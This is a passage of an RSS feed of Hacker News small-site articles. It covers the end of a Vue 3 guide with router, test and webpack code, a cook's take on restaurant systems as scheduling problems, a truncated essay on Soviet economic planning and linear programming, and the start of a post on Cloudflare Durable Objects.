<span>import</span><span> </span><span>BlogIndex</span><span> </span><span>from</span><span> </span><span>"</span><span>@/components/blog/views/BlogIndex.vue</span><span>"</span><span>;</span>

<span>const</span><span> </span><span>routes</span><span>:</span><span> </span><span>Array</span><span>&lt;</span><span>RouteRecordRaw</span><span>&gt;</span><span> </span><span>=</span><span> [</span>
<span>  </span><span>{</span>
<span>    path</span><span>:</span><span> </span><span>'</span><span>/</span><span>'</span><span>,</span>
<span>    name</span><span>:</span><span> </span><span>'</span><span>blog.index</span><span>'</span><span>,</span>
<span>    component</span><span>:</span><span> </span><span>BlogIndex</span><span>,</span><span> </span><span>// without webpack code splitting</span>
<span>  </span><span>},</span>
<span>  </span><span>{</span>
<span>    path</span><span>:</span><span> </span><span>'</span><span>/post/:slug</span><span>'</span><span>,</span>
<span>    name</span><span>:</span><span> </span><span>'</span><span>blog.show</span><span>'</span><span>,</span>
<span>    </span><span>// with webpack code splitting (best for larger apps, it can lazy load then):</span>
<span>    </span><span>component</span><span>:</span><span> </span><span>()</span><span> </span><span>=&gt;</span><span> </span><span>import</span><span>(</span><span>/* webpackChunkName: "blog-show" */</span><span> </span><span>'</span><span>../components/blog/views/SinglePost.vue</span><span>'</span><span>)</span>
<span>  </span><span>},</span>
<span>]</span>

<span>const</span><span> </span><span>router</span><span> </span><span>=</span><span> </span><span>createRouter</span><span>(</span><span>{</span>
<span>  history</span><span>:</span><span> </span><span>createWebHashHistory</span><span>()</span><span>,</span>
<span>  </span><span>routes</span>
<span>}</span><span>)</span>

<span>createApp</span><span>(</span><span>App</span><span>)</span>
<span>    </span><span>.</span><span>use</span><span>(</span><span>router</span><span>) </span><span>// &lt;&lt; important!</span>
<span>    </span><span>.</span><span>mount</span><span>(</span><span>'</span><span>#app</span><span>'</span><span>)</span></code></pre>
<p>For a full example of <strong>using vue router in Vue 3</strong>, I recommend <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter" target="_blank" rel="noopener">looking at the sample Vue 3 boilerplate app, which includes Vue 3 and vue router</a>.</p>
<h3 id="testing-in-vue-3-with-vue-test-utils">Testing in Vue 3 with Vue Test Utils</h3>
<p>Testing in Vue 3 with Vue Test Utils is largely similar as it was in Vue 2.</p>
<p>Here is an example of a Vue Test Utils test (using Jest) for a component in Vue 3 which uses <code>&lt;router-link&gt;</code> (Vue Router).</p>
<pre><code><span>import</span><span> </span><span>{</span><span>mount</span><span>,</span><span> </span><span>RouterLinkStub</span><span>}</span><span> </span><span>from</span><span> </span><span>"</span><span>@vue/test-utils</span><span>"</span><span>;</span>
<span>import</span><span> </span><span>{</span><span>postFactory</span><span>}</span><span> </span><span>from</span><span> </span><span>"</span><span>@/components/blog/model/Post</span><span>"</span><span>;</span>
<span>import</span><span> </span><span>YourComponent</span><span> </span><span>from</span><span> </span><span>"</span><span>@/components/blog/components/YourComponent.vue</span><span>"</span><span>;</span>

<span>it</span><span>(</span><span>'</span><span>emits "deletePost"</span><span>'</span><span>,</span><span> </span><span>emitsDeletePost</span><span>)</span><span>;</span>

<span>function</span><span> </span><span>emitsDeletePost</span><span>()</span><span>:</span><span> </span><span>void</span><span> </span><span>{</span>
<span>    </span><span>const</span><span> </span><span>post</span><span> </span><span>=</span><span> </span><span>{</span><span>slug</span><span>:</span><span> </span><span>'</span><span>example-slug</span><span>'</span><span>};</span>

<span>    </span><span>const</span><span> </span><span>$router</span><span> </span><span>=</span><span> </span><span>{</span>
<span>        push</span><span>:</span><span> </span><span>jest</span><span>.</span><span>fn</span><span>()</span>
<span>    </span><span>}</span>
<span>    </span><span>const</span><span> </span><span>$route</span><span> </span><span>=</span><span> </span><span>{</span>
<span>        params</span><span>:</span><span> </span><span>{</span>
<span>            id</span><span>:</span><span> </span><span>1</span>
<span>        </span><span>}</span>
<span>    </span><span>}</span>

<span>    </span><span>const</span><span> </span><span>wrapper</span><span> </span><span>=</span><span> </span><span>mount</span><span>(</span><span>YourComponent</span><span>,</span><span> </span><span>{</span>
<span>        props</span><span>:</span><span> </span><span>{</span><span>post</span><span>},</span>
<span>        global</span><span>:</span><span> </span><span>{</span>
<span>            components</span><span>:</span><span> </span><span>{</span>
<span>                RouterLink</span><span>:</span><span> </span><span>RouterLinkStub</span>
<span>            </span><span>},</span>
<span>            mocks</span><span>:</span><span> </span><span>{</span><span>$route</span><span>,</span><span> </span><span>$router</span><span>}</span>
<span>        </span><span>}</span>
<span>    </span><span>}</span><span>)</span>

<span>    </span><span>const</span><span> </span><span>button</span><span> </span><span>=</span><span> </span><span>wrapper</span><span>.</span><span>get</span><span>(</span><span>'</span><span>button</span><span>'</span><span>)</span><span>;</span>
<span>    </span><span>button</span><span>.</span><span>trigger</span><span>(</span><span>'</span><span>click</span><span>'</span><span>)</span><span>;</span>

<span>    </span><span>expect</span><span>(</span><span>wrapper</span><span>.</span><span>emitted</span><span>(</span><span>'</span><span>deletePost</span><span>'</span><span>))</span><span>.</span><span>toEqual</span><span>([[</span><span>post</span><span>.</span><span>slug</span><span>]])</span>
<span>}</span></code></pre>
<h3 id="using-typescript-in-vue-3">Using Typescript in Vue 3</h3>
<p>Vue 3 fully supports Typescript. The fact that it works so well now with Typescript is one of my favourite new things about Vue 3. It was always a bit hard to get everything typed correctly in Vue 2. </p>
<p>It is still possible to use plain Javascript with Vue 3, if you are not keen on Typescript.</p>
<p><strong>This section of my Vue 3 guide explains how to install and set up Typescript with a Vue 3 installation.</strong></p>
<p>For the configuration to set up Typescript in Vue 3 I would recommend looking <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter/blob/main/tsconfig.json" target="_blank" rel="noopener">at this tsconfig.json</a>. </p>
<p>There are some packages which will need to be installed.</p>
<p>If you originally set up Vue via the Vue CLI and are adding Typescript manually then run <code>yarn add -D @vue/cli-plugin-typescript</code>.</p>
<p>For custom setups you will need <code>yarn add -D typescript vue-loader</code> (check out package.json in that repo). </p>
<p>You will also need to update or create your <code>webpack.config.js</code> config file. The important lines are marked below with <code>&lt;&lt;</code>.</p>
<pre><code><span>const</span><span> </span><span>path</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>'</span><span>path</span><span>'</span><span>)</span>
<span>const</span><span> </span><span>{</span><span> </span><span>VueLoaderPlugin</span><span> </span><span>}</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>'</span><span>vue-loader</span><span>'</span><span>)</span><span>;</span><span> </span><span>// &lt;&lt;</span>

<span>module</span><span>.</span><span>exports</span><span> </span><span>=</span><span> </span><span>{</span>
<span>  entry</span><span>:</span><span> </span><span>'</span><span>./src/main.ts</span><span>'</span><span>,</span>
<span>  plugins</span><span>:</span><span> [</span>
<span>    </span><span>new</span><span> </span><span>VueLoaderPlugin</span><span>() </span><span>// &lt;&lt;</span>
<span>  ]</span><span>,</span>
<span>  output</span><span>:</span><span> </span><span>{</span>
<span>    path</span><span>:</span><span> path</span><span>.</span><span>resolve</span><span>(__dirname</span><span>,</span><span> </span><span>'</span><span>./dist</span><span>'</span><span>)</span><span>,</span>
<span>  </span><span>},</span>
<span>  module</span><span>:</span><span> </span><span>{</span>
<span>    rules</span><span>:</span><span> [</span>
<span>      </span><span>{</span>
<span>        test</span><span>:</span><span> </span><span>/\.</span><span>vue</span><span>$</span><span>/</span><span>,</span>
<span>        loader</span><span>:</span><span> </span><span>'</span><span>vue-loader</span><span>'</span><span> </span><span>// &lt;&lt;</span>
<span>      </span><span>}</span>
<span>    ]</span>
<span>  </span><span>}</span>
<span>}</span></code></pre>
<p>Once set up, all you have to do is change <code>&lt;script&gt;</code> to <code>&lt;script lang="ts"&gt;</code> in your <code>.vue</code> files.</p>
<p>You can also find more information on <a href="https://webdevetc.com/programming-tricks/typescript/webpack/guide-to-typescript-config-for-webpack/">setting up Typescript with Webpack here</a>.</p>
</div></div>]]>
            </description>
            <link>https://webdevetc.com/blog/vue-3-guide-with-example-code-snippets/#using-typescript-in-vue-3</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084928</guid>
            <pubDate>Fri, 13 Nov 2020 17:34:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Double fetches, scheduling algorithms, and onion rings]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25084909">thread link</a>) | @markmossberg
<br/>
November 13, 2020 | https://offlinemark.com/2020/11/12/double-fetches-scheduling-algorithms-onion-rings/ | <a href="https://web.archive.org/web/*/https://offlinemark.com/2020/11/12/double-fetches-scheduling-algorithms-onion-rings/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Most people thought I was crazy for doing this, but I spent the last few months of my gap year working as a short order cook at a family-owned fast-food restaurant. (More on this <a href="https://offlinemark.com/2020/11/12/gap-year-restaurant/">here</a>.) I’m a programmer by trade, so I enjoyed thinking about the restaurant’s systems from a programmer’s point of view. Here’s some thoughts about two such systems.</p>



<h2>Double, triple, and even quadruple fetching</h2>



<p>Human systems, at first glance, can appear broken, but due to subtle human factors, they might actually work just fine.</p>



<p>My best example is the system for taking and fulfilling orders. We never wrote anything down, and would re-ask orders multiples times, including when ringing customers up. (In computer security, this is known as a <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch/">double fetch</a>.) Not great service and can theoretically let customers lie and pay less. </p>



<p>In practice most customers didn’t mind <em>too</em> much, liars are rare, and we can loosely detect when something seems off with an order.</p>



<p>Writing orders down and asking strictly once seems optimal but has subtle flaws. For one thing, there’s not enough space behind the counter for everyone to walk to the written order, so it requires more internal communication. This will fail during a rush when you’re blocked on order details and coworkers are too busy for questions. <strong>Customers are always idle; coworkers aren’t</strong>.</p>



<p>It can increase confusion if order slips aren’t thrown out when orders are finished and is also logistically (and literally) messy if you have greasy gloves and want to avoid touching a pen, then food. Lastly, many of my coworkers were older and very used to the existing system. <strong>A major transition to a new system would have generated more confusion than it’s worth</strong>.</p>



<h2>Scheduling algorithms for the fry cook</h2>



<p>While I covered a range of duties including the cash register, milkshake machine, and grill, I spent the most time on the deep fryer. I’m delighted to present this overanalysis of life as a fry cook, from a programmer’s point of view.</p>



<p>This is what deep fryers look like (<a href="https://www.google.com/url?sa=i&amp;url=https%3A%2F%2Fwww.nachi.org%2Fdeep-fryer-inspection.htm&amp;psig=AOvVaw1D90dsceyn1wmU-KOGAEuy&amp;ust=1605391502547000&amp;source=images&amp;cd=vfe&amp;ved=0CAIQjRxqFwoTCNCq-sPDgO0CFQAAAAAdAAAAABAE">source</a>):</p>



<div><figure><img loading="lazy" src="https://i0.wp.com/d12m281ylf13f0.cloudfront.net/images10-2/commercial-fryer-2.jpg?resize=360%2C352&amp;ssl=1" alt="Deep Fryer" width="360" height="352" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/d12m281ylf13f0.cloudfront.net/images10-2/commercial-fryer-2.jpg?resize=360%2C352&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>This picture has 2 fryers, each with 2 baskets that can be submerged to sit in the vats of hot oil below. At work, only 1 fryer would be active on any given day which effectively allows 2 items to be fried at the same time.</p>



<p><strong>Fry cooks have a lot in common with operating systems in that they are both responsible for scheduling</strong>. Operating systems schedule threads to run on a limited number of cores; fry cooks schedule food to be fried in a limited number of fryers. Different food items have different priorities, and different lengths of time to cook.</p>



<p>French fries, curly fries, and onion rings (collectively, “fries”) are the main menu items from the deep fryer. Each fry order could be large or small (except for rings which were only large) and eat-in or to-go. The job of the fry cook is to:</p>



<ul><li>Accept fry orders from the greeter.</li><li>Allocate portions of fries from the big bags of raw fries</li><li>Cook them in the fryers</li><li>Put them into the appropriate eat-in/to-go container</li><li>Serve them onto the customer’s tray on the counter, or their to-go bag</li></ul>



<p>The goal is to do this with maximum speed and accuracy and without dropping orders. You’ll ideally minimize the number of times you ask customers and coworkers for order details. In addition, there are a few sources of complexity to handle:</p>



<ul><li><strong>Incomplete information</strong>: Depending on the greeter, they may forget to specify if it’s eat-in or to-go. You can always ask the customer, but the grill chef will likely ask the same question in a little bit. You might be able to save a customer ask if you can eavesdrop on that interaction.</li><li><strong>Timing requirements</strong>: You need to finish orders by the time the grill chef finishes the burgers/hot dogs, but you shouldn’t finish too early. If you put the fries on the counter way before the burgers are ready, they’ll get cold. This matters less for to-go orders, which you can serve into the bag immediately.</li><li><strong>Scale</strong>: During a rush, you might receive many orders per minute, while only being able to process 1-2 per minute. Once the greeter relays the order, they forget it, so it’s up to you to remember. And remember: no writing things down.</li><li><span><strong>Waste avoidance</strong>: </span>Sometimes you or another cook will make too many fries. To avoid wasting them, you can use the excess towards a future order by refreshing them with a splash later and adding them to a fresh batch.</li><li><strong>Changing orders</strong>: Customers sometimes change their order after you’ve started cooking (e.g. regular fry to curly fry). Now you have to figure out what to do with the partially cooked portion currently in the fryer.</li><li><strong>Miscellaneous items</strong>: In addition to fries, there other items that need to be scheduled for time in the fryer, including chicken patties, bacon, clam strips, and fish fillets. </li></ul>



<p>A few techniques to manage all this:</p>



<ul><li><strong>Batching orders together</strong>. If a large and small fry order are in the queue, you can cook them in the same basket at the same time.<ul><li>Some customers request their fries “well done”, meaning cooked extra long. This makes batching more complicated.</li></ul></li><li><strong>“Wait n Splash”</strong>: If a fry order is done cooking far before the rest of the grill items and you don’t have pressing items that need fryer time, you can raise the basket from the oil, but leave the food in it. When the grill items finish, you can quickly splash the food back in the oil to refresh it, then serve it. This will prevent it from getting cold on the counter.</li><li><strong>Inactive fryer baskets</strong>: It can be handy to have extra storage space for cooked food. If you have a “wait n splash” order waiting, but you have more orders to fry, you can use the 2 spare baskets from the inactive fryer to store the waiting order and free up the fryer slot. This is also useful when customers change their order and you need to quickly stash the half cooked portion somewhere and start the adjusted order.</li><li><strong>“The tong dip”</strong>: If both fryers are in use and the grill chef hands you bacon to be urgently cooked, you can hold the bacon in tongs and dip it into one of the submerged baskets. This lets you effectively cook more than 2 things at the same time.</li></ul>



<p>Here’s the system I ended up using. When a new order came in, I’d stop whatever I was doing and grab the appropriate container and place it in the corresponding fry bucket. This captures all 3 pieces of information about the order (fry type, size, to-go?) letting me forget it. If I strictly follow this, I can just process the containers in the buckets like a queue. However, I still need to keep a sense of order memorized because the system doesn’t capture global ordering – if I have containers in the fry, curly fry, and onion ring buckets, I can’t tell which order came in first.</p>



<p>I don’t have a solution for this. On a super busy day, this system falls apart and I drop orders. Extreme load like that has only happened a few times and in that case, I just make large batches, forget about syncing up with the grill items, and hope I don’t have too much excess at the end. Generally, the system worked nicely.</p>



<h2>Conclusion</h2>



<p>It’s fun to think about human systems, like those in a restaurant, from a programmer’s point of view. A fry cook’s job closely resembles that of an operating system scheduler, complete with optimization points and edge cases. One can try to optimize human systems as if they were computer systems, but it’s critical to understand the subtle human aspects of the system when evaluating improvements.</p>



<div><div>
<div><div>
<div><div>
<hr>



<h3>Learn something new? Let me know!</h3>



<p>Did you learn something from this post? I’d love to hear what it was — tweet me <a href="https://twitter.com/offlinemark">@offlinemark</a>! </p>



<p>I also have a mailing list if you want to know when I write new posts:</p>






<hr>
</div></div>
</div></div>
</div></div>
					</div></div>]]>
            </description>
            <link>https://offlinemark.com/2020/11/12/double-fetches-scheduling-algorithms-onion-rings/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084909</guid>
            <pubDate>Fri, 13 Nov 2020 17:33:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimizing Things in the USSR (2016)]]>
            </title>
            <description>
<![CDATA[
Score 121 | Comments 140 (<a href="https://news.ycombinator.com/item?id=25084479">thread link</a>) | @amai
<br/>
November 13, 2020 | https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/ | <a href="https://web.archive.org/web/*/https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>11 May 2016</span></p><meta charset="utf-8">



<p>As a data scientist, a big part of my job involves picking metrics to optimize and thinking about how to do things as efficiently as possible. With these types of questions on my mind, I recently discovered a totally fascinating book about about economic problems in the USSR and the team of data-driven economists and computer scientists who wanted to solve them. The book is called <a href="http://www.amazon.com/Red-Plenty-Francis-Spufford/dp/1555976042"><em>Red Plenty</em></a>. It’s actually written as a novel, weirdly, but it nevertheless presents an accurate economic history of the USSR. It draws heavily on an earlier book from 1973 called <a href="http://www.amazon.com/Planning-Problems-USSR-Contribution-Mathematical/dp/0521202493"><em>Planning Problems in the USSR</em></a>, which I also picked up. As I read these books, I couldn’t help but notice some parallels with planning in any modern organization. In what will be familiar to any data scientist today, the second book even includes a quote from a researcher who complained that 90% of his time was spent cleaning the data, and only 10% of his time was spent doing actual modeling!</p>

<p>Beyond all the interesting parallels to modern data science and operations research, these books helped me understand a lot of interesting things I previously knew very little about, such as linear programming, price equilibria, and Soviet history. This blog post is about I learned.</p>

<h4>Balance sheets and manual calculation: Kind of a trainwreck</h4>

<p>The main task in the centrally planned Soviet economy was to allocate resources so that a desired assortment of goods and services was produced. Every year, certain target outputs for each good were established. Armed with estimates of the available input resources, central administrators used balance sheets to set plans for every factory, specifying exactly how much input commodities each factory would receive, and how much output it should produce. Up through the 1960s, this was always done by manual calculation. Since there were hundreds of thousands of commodities, and since the supply chains had many dependency steps, it was impossible to compute the full balance sheets for the economy. The administrators therefore decided to make some simplifying assumptions. As a result of these these simplifying assumptions, resource allocation became a bit of a trainwreck. Below are a few of the simplifications and their consequences.</p>

<ul>
  <li><strong>Dimensionality reduction by removing variables.</strong> Because there were too many commodities to track, administrators often limited their analysis to the 10,000 most important commodities in the economy. But when the production of those commodities were planned, there was often a hidden shortage of commodities whose output was not planned centrally but which were used as inputs to one of the 10,000 planned products. Factories that depended on those commodities often sat idle for months as they waited for the shortages to end.</li>
  <li><strong>Dimensionality reduction by aggregation.</strong> Apparently, steel tubes can come in thousands of different types. They can come in different lengths, different shapes, and different compositions. To reduce the dimensionality of the problem, administrators would often track the total tonnage of a few broad classes of steel tubes in the models, rather than using a more detailed classification scheme. While their models successfully balanced the tonnage of tubes for the broad categories (the output in tons of tube-producing factories matched the input requirements in tons of tube-consuming factories), there were constant surpluses of some specific types of tubes, and shortages of other specific types of tubes.&nbsp;In particular, since tonnage was used as a metric, tube-producing factories were overly incentivized to make easy-to-produce thick tubes. As a result, thin tubes were always in short supply.</li>
  <li><strong>Propagating adjustments only a few degrees back.</strong> Let’s say that during balance calculations, the administrators realized they needed to bump up the target output of one commodity. If they did that, it was also necessary to bump up the output targets of commodities that were input into the target commodity. But if they did <em>that</em>, they also needed to bump up the output targets of commodities that fed into those commodities, and so on! This involved a crazy amount of extra hand calculations every time they needed make an adjustment. To simplify things, the administrators typically made adjustments to the first-order suppliers, without making the necessary adjustments to the suppliers of the suppliers. This of course led to critical shortages of input commodities, which again led to idle factories.</li>
</ul>

<!-- The tooltip has absolute positioning, which means it is positioned
"relative" to any parent it has who has either absolute or relative positioning.
The #econ_scatter parent would by default be static, so I have to change it to
relative -->
<div>
  
  
  <p><strong>Figure 1.</strong> Some example inputs and outputs in the Soviet economy in 1951, described in units of weight. This summary shows an extreme dimensionality reduction, more extreme than was ever used in planning. In this diagram, most commodities are excluded and each displayed commodity collapses across multiple different product types. Multiple steps in the supply chain are collapsed into a single step. (Source: <a href="http://www.foia.cia.gov/sites/default/files/document_conversions/89801/DOC_0000380738.pdf">CIA</a>)</p>
</div>

<p><br>Even if the administrators could get the accounting correct, which they couldn’t, their attempts to allocate resources would still be far from optimal. In the steel industry, for example, some factories were better at producing some types of tubes whereas others were better at producing other types of tubes. Since there were thousands of different factories and tube types, it was non-trivial to decide how to best distribute resources and output requirements, and it was not immediately obvious which factories should be expanded and which should be closed down.</p>

<h4>Supply chain optimizations</h4>

<p>In the late 1960’s, a group of economists and computer scientists known as the “optimal planners” began to push for a better way of doing things. The group argued that a technique called <a href="https://www.math.ucla.edu/~tom/LP.pdf">linear programming</a>, invented by <a href="https://en.wikipedia.org/wiki/Leonid_Kantorovich">Leonid Kantorovich</a>, could optimally solve the problems with the supply chain. At a minimum, since the process could be computerized, it would be possible to perform more detailed calculations than could be done by hand, with less dimensionality reduction. But more importantly, linear programming allowed you to optimize arbitrary objective functions given certain constraints. In the case of the supply chain, it showed you how to efficiently allocate resources, identifying efficient factories that should get more input commodities, and inefficient factories that should be shut down.</p>

<div>
  <p><img src="https://chris-said.io/assets/kantorovich.jpg" height="300"></p>
  <p><strong>Figure 2.</strong> Leonid Kantorovich, inventor of linear programming and winner of the 1975 Nobel Prize in Economics.</p>
</div>

<p><br>The optimal planners had some success here. For example, in the steel industry, about 60,000 consumers requested 10,000 different types of products from 500 producers. The producers were not equally efficient in their production. Some producers were efficient for some types of steel products, but less efficient for other types of steel products. Given the total amount of each product requested, and given the constraints of how much each factory can produce, the goal was decide how much each factory should produce of each type of product. If we simplify the problem by just asking how much each factory should produce without considering how the products will be distributed to the consuming factories, this becomes a straightforward application of the <a href="https://www.math.ucla.edu/~tom/LP.pdf">Optimal Assignment Problem</a>, a well-studied example in linear programming. If we additionally want to optimize distribution, taking into account the distance-dependent costs of shipments from one factory to another, the problem becomes more complicated but is still doable. The problem becomes similar to the <a href="https://www.math.ucla.edu/~tom/LP.pdf">Transportation Problem</a>, another well-studied example in linear programming, but in this case generalized to multiple commodities instead of just one.</p>

<p><img src="https://chris-said.io/assets/steel_tubes.jpg" height="200"></p>

<p>By introducing linear programming, the optimal planners were modestly successful at improving the efficiency of some industries, but their effect was limited. First, political considerations prevented many of the recommendations surfaced by the model from being implemented. Cement factories that were known to be too inefficient or too far away from consumers were allowed to remain open even though the optimal solution recommended that they be closed. Second, since the planners were only allowed to work in certain narrow parts of the economy, they never had an opportunity to propagate their recommendations back in the supply chain, although one could imagine extending the models to do so. Third, and perhaps most importantly, the value of each commodity was set by old-school administrators in an unprincipled way, and so the optimal planners were forced to optimize objective functions that didn’t even make sense.</p>

<h4>Ideas about optimizing the entire economy</h4>

<p>While the optimal planners were able to improve the efficiency of a few industries, they had more ambitious plans. They believed they could use linear programming to optimize the entire economy and outperform capitalist societies. Doing so involved more than just scaling out the supply chain optimizations adopted by certain industries. It involved shadow prices and interest rates, and a few other things I’ll admit I don’t totally understand. But while I don’t really understand the implementation, I feel like the broader goal of the planners is easier to understand and explain:</p>

<p>Basically, in a completely free market, at least under <a href="https://en.wikipedia.org/wiki/Arrow%E2%80%93Debreu_model">certain assumptions</a>, prices are supposed to converge to what’s called a General Equilibrium. The equilibrium prices have a some nice properties. They balance aggregate supply and demand, so that no commodities are in shortage or surplus. They are also <a href="https://en.wikipedia.org/wiki/Pareto_efficiency">Pareto efficient</a>, which means that nobody in the economy can be made better off without making someone else worse off.</p>

<p>The optimal planners thought that they could do better. In particular, they pointed to two problems with capitalism: First, prices in a capitalist society were determined by individual agents using trial and error to guess the best price. Surely these agents, who had imperfect information, were not picking the exactly optimal prices. In …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/">https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/</a></em></p>]]>
            </description>
            <link>https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084479</guid>
            <pubDate>Fri, 13 Nov 2020 17:10:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Durable Objects in Production]]>
            </title>
            <description>
<![CDATA[
Score 123 | Comments 55 (<a href="https://news.ycombinator.com/item?id=25084470">thread link</a>) | @geelen
<br/>
November 13, 2020 | https://linc.sh/blog/durable-objects-in-production | <a href="https://web.archive.org/web/*/https://linc.sh/blog/durable-objects-in-production">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>A few weeks ago, Cloudflare announced Durable Objects: a <a href="https://blog.cloudflare.com/introducing-workers-durable-objects/">"truly serverless approach to storage and state"</a>, which piqued our interest here at <a href="https://linc.sh/">Linc</a>. We're already big proponents of Cloudflare Workers (Workers is our <a href="https://linc.sh/why-cloudflare">recommended deploy target</a>, after all), so we're always interested in what new capabilities that platform is getting. But it was this section that sounded <em>ideal</em> for solving a particularly annoying UX problem with much less code/infrastructure than we'd assumed we would need (see the <a href="#building-this-without-durable-objects">comparison section</a> at the end).</p><blockquote><em>Historically ... there was no way to control which instance received a request, [so] there was no way to force two clients to talk to the same Worker... Durable Objects change that: </em><strong><em>requests related to the same topic can be forwarded to the same object, which can then coordinate between them, without any need to touch storage</em></strong><em>.</em></blockquote><p>This is a big deal. And, after a few days tinkering, we've been able to successfully deploy our solution to production! In this post we'll talk about the problem we solved, how Durable Objects work, we'll go through the code and what it's like working with them, and then look at just how much work it saved us.</p><blockquote><strong><em>Note:</em></strong><em> Durable Objects are in </em><a href="http://www.cloudflare.com/cloudflare-workers-durable-objects-beta"><em>limited beta</em></a><em>, and "not recommended for production use" (yet). However, our use-case doesn't push any of the </em><a href="https://developers.cloudflare.com/workers/learning/using-durable-objects#limitations-during-the-beta"><em>beta limits</em></a><em> and we're using it to </em><a href="#the-client"><em>progressively enhance</em></a><em> our existing solution, so we've felt safe </em><a href="#demo"><em>deploying it</em></a><em> to production already!</em></blockquote><h2>The problem—streaming build logs</h2><p>While Linc is a product focussed on automating deployments and previewing each commit, a big part of the day-to-day usage is building commits from source into a <a href="https://fab.dev/">FAB</a>, and viewing the logs of that process is a core piece of the product:</p><figure><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fad68c90ccf85995706ac8a_98383039-e31a9580-2043-11eb-89ee-ca0fd3a9481a.png" alt="image"></p></figure><p>When you're first getting set up, or when something changes in your build or goes awry, you can find yourself poring over these logs to find and fix your issue. And so being able to watch them "live", as they're being built, is a useful tool in reducing your feedback loop (and of course Linc is big on <a href="https://linc.sh/blog/bottleneck">reducing feedback loops</a>!). But that turns out to be an annoyingly difficult feature to implement.</p><p>For starters, most of the time a build will start before any clients are watching (but not always e.g. when restarting a build after a config change). In this case, you need to accumulate a partial build log <em>somewhere</em> so it's ready to send it to the first client to connect. And multiple clients might be watching the same build, and disconnect/reconnect at any moment, too. It's not intractable, but it's just complex enough to be tricky.</p><h3>Our current compromise: reuse our existing GraphQL subscriptions</h3><p>Until now, we've taken a pragmatic approach: use GraphQL subscriptions to periodically flush the entire `Build` record, logs included, every few seconds. This actually reuses our existing live-update infrastructure that powers almost every view in the app:</p><figure><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fae92591d7dddb3a6e3cd2c_Current%20Implementation.png" loading="lazy" alt=""></p></figure><p>So while updates are triggered from DB events, using a GraphQL subscription server in this way gives us an important guarantee: <strong>the clients are <em>always</em> getting the full snapshot of the data that they're interested in</strong>. In other words, <em>any</em> change to a record in the DB results in the client getting a full update of any affected queries from the server—there's no need to manage or merge updates on the client, it can simply replace its local cache with the latest update. It makes a fully live UI <em>much</em> easier to implement, at the expense of some redundant data transfer.</p><p>As a general pattern, it's worked fantastically for us. But to send each log of a current build line-by-line it's way way <em>way</em> too heavy. Not just in terms of sending way more data than necessary, but we'd be absolutely thrashing our Dynamo table &nbsp;<em>even if nobody's watching the logs currently</em>. So, we've taken a compromise: use the existing infrastructure and flush the logs to the DB every ~10 seconds. Most builds take between 2 and 4 minutes so it's only a handful of extra writes, and it feels OK for a stop-gap. We've had an open ticket to build out a dedicated log-streaming solution but the <a href="#building-this-without-durable-objects">amount of additional infrastructure</a> put us off. That is until Durable Objects came along...</p><h2>What are Durable Objects?</h2><blockquote><em>Note: it's worth reading the </em><a href="https://blog.cloudflare.com/introducing-workers-durable-objects/"><em>introductory blog post</em></a><em> to get a background, but this is my best attempt at a TL;DR:</em></blockquote><p>Durable Objects are a way of defining a serverless function as an <strong>instance of a JS class</strong>. They can't be reached by external HTTP requests directly, instead a "normal" (i.e. stateless) Worker creates/accesses instances using their <strong><em>namespace</em></strong> (usually the name of their class) and an <strong><em>id</em></strong>. For a given <strong><em>namespace</em></strong> &amp; <strong><em>id</em></strong>, there will be <strong>exactly one</strong> instance, somewhere in the world, and it can store data. Instances communicate with workers over normal HTTP requests/responses, and support websockets.</p><p>If you find that a bit confusing, you're not alone! I didn't really "get" it until I'd read an example, so I've reproduced and commented our Worker and Object code in <a href="#the-solution">The Solution</a> section below.</p><h3>Durable Objects? "Stateful workers"? "Materialised actors"?</h3><p>I hope it's not terribly controversial, but I'm not a big fan of the name "Durable Objects". It conjures a very data-centric model, where it sounds like a way to... maybe define classes that magically run in the cloud, and where instances... maybe get "frozen" and stored when they go idle? It presents it like a type of database, whereas the reality is much closer to the Worker/Serverless model, just with per-worker storage.</p><p>That said, the phrase "workers with per-worker storage" <em>massively</em> downplays how incredibly transformative this concept is, though, so I get that Cloudflare <em>want</em> it to sound like a "whole new thing". But conceptually, you may be better thinking about these as "materialised <a href="https://en.wikipedia.org/wiki/Actor_model">actors</a>" or, as we've come to coining them internally "stateful workers".</p><p>We'll just call them "Objects" and "instances" in the remainder of this blog post.</p><h3>Instances as a kind of "state"</h3><p>In the documentation, there's a lot of focus on the fact that an Object has its own key-value storage using `controller.storage`. But that API is available only once you have a live <em>instance</em> of an Object, and getting <em>there</em> is actually a whole type of state in disguise.</p><p>The key phrase is <a href="https://blog.cloudflare.com/introducing-workers-durable-objects/#what-is-a-durable-object">here</a>:</p><blockquote><em>Each object has a globally-unique identifier. That object exists in only one location in the whole world at a time. Any Worker running anywhere in the world that knows the object's ID can send messages to it. All those messages end up delivered to the same place.</em></blockquote><p>Combine this with the fact that each Object instance supports websockets, suddenly you can define a system 